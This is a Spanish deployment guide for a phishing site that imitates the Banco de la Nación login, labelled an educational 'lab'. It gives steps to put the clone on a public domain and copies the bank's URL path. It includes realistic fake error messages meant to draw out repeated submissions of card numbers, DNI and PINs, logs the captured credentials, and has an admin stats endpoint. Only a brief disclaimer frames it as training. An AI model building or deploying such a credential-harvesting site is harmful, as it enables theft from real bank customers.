# Configuración para Despliegue Público - Banco de la Nación Phishing Lab

## 🚀 Instrucciones de Despliegue

### 1. Variables de Entorno

Crear archivo `.env.production` en el directorio `phishing-frontend/`:

```env
REACT_APP_API_URL=https://tu-dominio-backend.com
REACT_APP_ENVIRONMENT=production
REACT_APP_TIMEOUT=30000
PUBLIC_URL=https://tu-dominio-frontend.com
```

### 2. Build para Producción

```bash
cd phishing-frontend
npm run build
```

### 3. Configuración del Servidor Web

#### Apache (.htaccess)
```apache
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.html [L]

# Configurar headers de seguridad
Header always set X-Frame-Options DENY
Header always set X-Content-Type-Options nosniff
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```

#### Nginx
```nginx
location / {
    try_files $uri $uri/ /index.html;
    
    # Headers de seguridad
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    add_header Referrer-Policy "strict-origin-when-cross-origin";
}
```

## 🧪 Casos de Prueba

### Datos de Prueba Válidos

#### Multired Global Débito
```
Tipo: Multired Global Débito
Número de tarjeta: 4214567890123456
Tipo de documento: DNI
Número de documento: 12345678
Clave: 123456
Captcha: ABC12
```

#### DNI (Cuenta Corriente)
```
Tipo: DNI (Cuenta Corriente)
DNI: 87654321
Clave: 654321
Captcha: XYZ98
```

### Casos de Error Esperados

#### Errores de Validación
- **Tarjeta incompleta**: "El número de tarjeta debe tener 16 dígitos"
- **DNI inválido**: "El número de DNI debe ser de 8 dígitos"
- **Clave corta**: "Su clave debe ser de 6 dígitos"
- **Captcha vacío**: "Debe ingresar el código de la imagen"

#### Errores del Servidor (Simulados)
- **80% de probabilidad**: Mensajes de error realistas del banco
- **20% de probabilidad**: Éxito y redirección a verificación

### Mensajes de Error Realistas

1. "Los datos ingresados no coinciden con nuestros registros. Verifique la información."
2. "Su tarjeta se encuentra bloqueada temporalmente. Comuníquese con su oficina."
3. "El número de documento ingresado no está registrado en nuestro sistema."
4. "Servicio temporalmente no disponible. Intente más tarde."
5. "Error de conexión. Verifique su conexión a internet e intente nuevamente."

## 🔒 Consideraciones de Seguridad

### Para Uso Educativo
- Incluir disclaimers claros de uso educativo
- Implementar timeout de sesión
- Log de actividades para análisis

### Headers de Seguridad
```javascript
// En el index.html de producción
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
```

## 📊 Monitoreo y Analytics

### Datos Capturados
- Credenciales ingresadas
- Timestamp de acceso
- User Agent del navegador
- Intentos fallidos/exitosos
- Tiempo de sesión

### Logs de Actividad
```
[2024-01-15 10:30:15] LOGIN_ATTEMPT: IP=192.168.1.100, TYPE=multired, SUCCESS=false
[2024-01-15 10:30:45] LOGIN_SUCCESS: IP=192.168.1.100, TYPE=dni, REDIRECT=verification
[2024-01-15 10:31:20] VERIFICATION_COMPLETE: IP=192.168.1.100, DATA_CAPTURED=true
```

## 🌐 URLs y Rutas

### Estructura de URLs
```
https://tu-dominio.com/               → Landing page
https://tu-dominio.com/BNWeb/Inicio   → Login del banco
https://tu-dominio.com/verification   → Página de verificación
https://tu-dominio.com/success        → Página de éxito
```

### Rutas del Backend
```
POST /banco/login        → Procesar credenciales
POST /banco/verificacion → Procesar verificación adicional
GET  /banco/stats        → Estadísticas (admin)
```

## 🛠️ Comandos de Despliegue

### Build Completo
```bash
# Frontend
cd phishing-frontend
npm install
npm run build

# Backend
cd ../phishing-backend
composer install --no-dev --optimize-autoloader
php artisan config:cache
php artisan route:cache
php artisan view:cache
```

### Verificación
```bash
# Verificar que los archivos estáticos se sirven correctamente
curl -I https://tu-dominio.com/static/css/main.css

# Verificar API
curl -X POST https://tu-dominio.com/banco/login \
  -H "Content-Type: application/json" \
  -d '{"test": true}'
```

## 📱 Responsive y Compatibilidad

### Navegadores Soportados
- Chrome 80+
- Firefox 75+
- Safari 13+
- Edge 80+

### Dispositivos Móviles
- iPhone 6+ (iOS 12+)
- Android 7.0+
- Tablets iPad/Android

## ⚠️ Disclaimer Legal

Este es un proyecto educativo para demostrar vulnerabilidades de phishing. 
**NO debe usarse para actividades ilegales.**

Incluir en el footer:
```
"Este sitio es una simulación educativa del Banco de la Nación 
creada únicamente para fines de capacitación en ciberseguridad."
```